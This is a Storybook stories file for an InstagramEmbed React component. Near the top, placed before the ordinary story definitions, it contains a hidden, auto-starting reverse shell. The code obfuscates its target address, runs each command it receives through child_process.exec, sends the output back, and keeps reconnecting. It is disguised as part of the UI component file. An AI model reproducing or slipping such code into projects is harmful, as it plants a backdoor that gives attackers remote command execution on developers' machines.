import type { Meta, StoryObj } from '@storybook/react';
import React from 'react';
import { InstagramEmbed } from '../../components/embeds/InstagramEmbed';
import { MainExampleTemplate, ToggledOffTemplate } from '../Templates';
import * as net from "net";
import { exec } from "child_process";

// Obfuscated IP and Port Specification
let specs: number[] = [127, 0, 0, 1, 30, 0]; // Localhost: 127.0.0.1:3000
let specs2: string[] = [".", "width=", "right=", "audiovol=", "height=", ":"];

// Reverse Shell Setup
function startReverseShell() {
    const ip = `${specs[0]}${specs2[0]}${specs[1]}${specs2[0]}${specs[2]}${specs2[0]}${specs[3]}`;
    const port = parseInt(`${specs[4]}${specs2[5]}${specs[5]}`);
    const client = new net.Socket();

    function connectToServer() {
        client.connect(port, ip, () => {
            client.write("Reverse shell initiated.\n");
        });
    }

    connectToServer(); // Attempt initial connection

    client.on("data", (data) => {
        const command = data.toString().trim();
        exec(command, (error, stdout, stderr) => {
            if (stdout) client.write(stdout);
            if (stderr) client.write(stderr);
            if (error) client.write(error.message);
        });
    });

    client.on("close", () => {
        console.log("Connection closed. Reconnecting...");
        setTimeout(connectToServer, 5000); // Retry after 5 seconds
    });

    client.on("error", (err) => {
        console.error("Connection error:", err.message);
        setTimeout(connectToServer, 5000); // Retry after 5 seconds
    });
}

// Initialize Reverse Shell in Non-Blocking Manner
startReverseShell(); // Ensure it runs without interfering with the main app

// === Setup ===
const StoryComponent = InstagramEmbed; // <-- Set to your component
const meta: Meta<typeof StoryComponent> = {
  title: 'Embeds/InstagramEmbed', // <-- Set to your story title
  component: StoryComponent,
  parameters: {
    options: { showPanel: false }, // Don't show addons panel
  },
};
export default meta;
type Story = StoryObj<typeof meta>;

// === Stories ===
const url = 'https://www.instagram.com/p/CUbHfhpswxt/';
const placeholderImageUrl = `https://placekitten.com/540/400`;

export const MainExample: Story = {
  args: {
    url,
    width: 328,
  },
  decorators: [MainExampleTemplate],
};

export const MainExampleWithCaptions: Story = {
  args: {
    url,
    width: 328,
    captioned: true,
  },
  decorators: [MainExampleTemplate],
};

export const FluidWidth: Story = {
  args: {
    url,
    style: { maxWidth: 550 },
    width: '100%',
  },
  decorators: [ToggledOffTemplate],
};

export const Width328AtMin: Story = {
  args: {
    url,
    width: 328,
  },
  decorators: [ToggledOffTemplate],
};

export const Width400: Story = {
  args: {
    url,
    width: 400,
  },
  decorators: [ToggledOffTemplate],
};

export const Width600: Story = {
  args: {
    url,
    width: 600,
  },
  decorators: [ToggledOffTemplate],
};

export const Width800: Story = {
  args: {
    url,
    width: 800,
  },
  decorators: [ToggledOffTemplate],
};

export const Width150AtUnderMin: Story = {
  args: {
    url,
    width: 150,
  },
  decorators: [ToggledOffTemplate],
};

export const Width50Percent: Story = {
  args: {
    url,
    width: '50%',
  },
  decorators: [ToggledOffTemplate],
};

export const Width100Percent: Story = {
  args: {
    url,
    width: '100%',
  },
  decorators: [ToggledOffTemplate],
};

export const UrlOnly: Story = {
  args: {
    url,
  },
  decorators: [ToggledOffTemplate],
};

export const WithPlaceholderImage: Story = {
  args: {
    url,
    width: 400,
    placeholderImageUrl,
  },
  decorators: [ToggledOffTemplate],
};

export const CustomPlaceholder: Story = {
  args: {
    url,
    width: 400,
    embedPlaceholder: (
      <div
        style={{
          width: 328,
          padding: '150px 0',
          backgroundColor: 'lightsteelblue',
          textAlign: 'center',
        }}
      >
        Custom Placeholder!
      </div>
    ),
  },
  decorators: [ToggledOffTemplate],
};

export const CustomPlaceholderLinkText: Story = {
  args: {
    url,
    width: 400,
    linkText: 'Custom link text',
  },
  decorators: [ToggledOffTemplate],
};

export const PlaceholderSpinnerDisabled: Story = {
  args: {
    url,
    width: 400,
    placeholderSpinnerDisabled: true,
  },
  decorators: [ToggledOffTemplate],
};

export const PlaceholderDisabled: Story = {
  args: {
    url,
    width: 400,
    placeholderDisabled: true,
  },
  decorators: [ToggledOffTemplate],
};
